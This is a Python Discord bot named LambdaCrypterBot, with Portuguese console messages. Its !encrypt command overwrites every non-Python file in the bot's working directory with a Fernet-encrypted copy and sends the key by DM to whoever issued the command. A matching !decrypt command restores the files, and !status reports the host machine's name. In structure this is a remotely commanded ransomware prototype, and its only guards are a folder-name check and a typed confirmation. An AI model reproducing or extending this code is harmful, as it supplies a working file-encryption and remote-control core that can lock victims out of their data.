# main.py
import discord
from discord.ext import commands
import os
import platform
from cryptography.fernet import Fernet
import base64
from datetime import datetime

# Import tokens
try:
    from config import OWNER_ID, BOT_TOKEN, SAFE_FOLDER
except ImportError:
    print("Erro: Arquivo config.py não encontrado!")
    print("Crie o arquivo config.py com OWNER_ID, BOT_TOKEN e SAFE_FOLDER")
    exit(1)

class LambdaCrypterBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.encryption_key = None
        self.owner_id = OWNER_ID
        
    async def on_ready(self):
        print(f'Bot conectado como {self.user}')
        print(f'Owner ID: {self.owner_id}')
        print(f'Pasta segura: {SAFE_FOLDER}')
        activity = discord.Activity(type=discord.ActivityType.watching, name="!help_cmd")
        await self.change_presence(activity=activity)
        
    async def send_embed(self, channel, title, description, color=0x00ff00):
        embed = discord.Embed(
            title=f"λ {title}",
            description=description,
            color=color,
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="λ-SYSTEM")
        await channel.send(embed=embed)

bot = LambdaCrypterBot()

# Comandos do Bot (mantidos iguais)
@bot.command()
async def status(ctx):
    """Display system status"""
    files_count = len([f for f in os.listdir('.') if os.path.isfile(f) and not f.endswith('.py')])
    
    status_msg = f"""
**System:** Online
**Files in directory:** {files_count}
**Host:** {platform.node()}
**Encryption Key:** {'🔑 Set' if bot.encryption_key else '❌ Not set'}
**Owner ID:** {bot.owner_id}
**Safe Folder:** {SAFE_FOLDER}
**Send !help_cmd for commands**
"""
    await bot.send_embed(ctx.channel, "SYSTEM STATUS", status_msg, 0x3498db)

@bot.command()
async def encrypt(ctx):
    """Encrypt files in current directory (USE WITH CAUTION)"""
    
    # Safety check
    current_folder = os.path.basename(os.getcwd())
    
    if current_folder != SAFE_FOLDER:
        await bot.send_embed(ctx.channel, "SAFETY BLOCKED", 
                           f"❌ **BLOCKED FOR SAFETY**\n"
                           f"This command only works in folder: `{SAFE_FOLDER}`\n"
                           f"Current folder: `{current_folder}`\n\n"
                           f"Create folder `{SAFE_FOLDER}` and test only there!",
                           0xe74c3c)
        return
    
    # User confirmation
    confirm_msg = await ctx.send(
        "⚠️ **SAFETY CONFIRMATION** ⚠️\n"
        "You are in the **SAFE** folder and want to encrypt the files?\n"
        "Type `CONFIRM` to continue or `CANCEL` to stop."
    )
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check)
    except:
        await ctx.send("Timeout. Operation cancelled.")
        return
    
    if msg.content.upper() != 'CONFIRM':
        await ctx.send("❌ Operation cancelled by user.")
        return
    
    # Encryption process
    bot.encryption_key = Fernet.generate_key()
    fernet = Fernet(bot.encryption_key)
    
    files = [f for f in os.listdir('.') if os.path.isfile(f) and not f.endswith('.py')]
    
    if not files:
        await bot.send_embed(ctx.channel, "NO FILES", "No files to process", 0xe74c3c)
        return
    
    await bot.send_embed(ctx.channel, "ENCRYPTION STARTED", f"Processing {len(files)} files", 0xf39c12)
    
    success_count = 0
    for file in files:
        try:
            with open(file, "rb") as f:
                original = f.read()
            encrypted = fernet.encrypt(original)
            with open(file, "wb") as f:
                f.write(encrypted)
            success_count += 1
        except Exception as e:
            print(f"Error encrypting {file}: {e}")
    
    # Send key via DM
    key_b64 = base64.b64encode(bot.encryption_key).decode()
    try:
        await ctx.author.send(f"🔑 **ENCRYPTION KEY:** ```{key_b64}```")
        key_msg = "Key sent to your DMs ✅"
    except:
        key_msg = "⚠️ Could not send key via DM"
    
    await bot.send_embed(ctx.channel, "ENCRYPTION COMPLETE", 
                       f"Files processed: {success_count}/{len(files)}\n{key_msg}", 0x2ecc71)

@bot.command()
async def decrypt(ctx, key: str):
    """Decrypt files with provided key: !decrypt YOUR_KEY"""
    
    # Safety check
    current_folder = os.path.basename(os.getcwd())
    
    if current_folder != SAFE_FOLDER:
        await bot.send_embed(ctx.channel, "SAFETY BLOCKED", 
                           f"❌ **BLOCKED FOR SAFETY**\n"
                           f"This command only works in folder: `{SAFE_FOLDER}`",
                           0xe74c3c)
        return
    
    if not key:
        await bot.send_embed(ctx.channel, "DECRYPTION FAILED", "No key provided", 0xe74c3c)
        return
    
    try:
        encryption_key = base64.b64decode(key)
        fernet = Fernet(encryption_key)
    except:
        await bot.send_embed(ctx.channel, "DECRYPTION FAILED", "Invalid key format", 0xe74c3c)
        return
    
    files = [f for f in os.listdir('.') if os.path.isfile(f) and not f.endswith('.py')]
    
    if not files:
        await bot.send_embed(ctx.channel, "NO FILES", "No encrypted files found", 0xe74c3c)
        return
    
    await bot.send_embed(ctx.channel, "DECRYPTION STARTED", f"Recovering {len(files)} files", 0xf39c12)
    
    success_count = 0
    for file in files:
        try:
            with open(file, "rb") as f:
                encrypted = f.read()
            decrypted = fernet.decrypt(encrypted)
            with open(file, "wb") as f:
                f.write(decrypted)
            success_count += 1
        except Exception as e:
            print(f"Error decrypting {file}: {e}")
    
    if success_count > 0:
        await bot.send_embed(ctx.channel, "DECRYPTION COMPLETE", f"Files recovered: {success_count}", 0x2ecc71)
    else:
        await bot.send_embed(ctx.channel, "DECRYPTION FAILED", "No files could be recovered", 0xe74c3c)

@bot.command()
async def help_cmd(ctx):
    """Show available commands"""
    help_msg = f"""
**Available Commands:**
`!status` - System status
`!encrypt` - Encrypt files (USE WITH CAUTION)
`!decrypt KEY` - Decrypt files with key
`!help_cmd` - This message
`!shutdown` - Shutdown bot (owner only)

**Example:**
`!decrypt gAAAAABmQ8b6aBfCk4eJz5r2x1vP8nYqL9wRtS7dFgHjKl3oMpNqAsZcXyVbEuIiKmO...`

⚠️ **USE ONLY IN {SAFE_FOLDER} FOLDER!**
"""
    await bot.send_embed(ctx.channel, "COMMAND HELP", help_msg, 0x9b59b6)

@bot.command()
async def shutdown(ctx):
    """Shutdown the bot (owner only)"""
    if ctx.author.id != bot.owner_id:
        await bot.send_embed(ctx.channel, "PERMISSION DENIED", 
                           "❌ Only the bot owner can use this command.", 0xe74c3c)
        return
    
    await bot.send_embed(ctx.channel, "SHUTDOWN", "🔴 Shutting down bot...", 0xe74c3c)
    print("🛑 Shutdown command received...")
    await bot.close()

if __name__ == "__main__":
    print("Starting LambdaCrypterBot...")
    print(f"⚠️ Make sure you are in the '{SAFE_FOLDER}' folder!")
    
    try:
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid BOT_TOKEN in config.py")
    except Exception as e:
        print(f"❌ Error: {e}")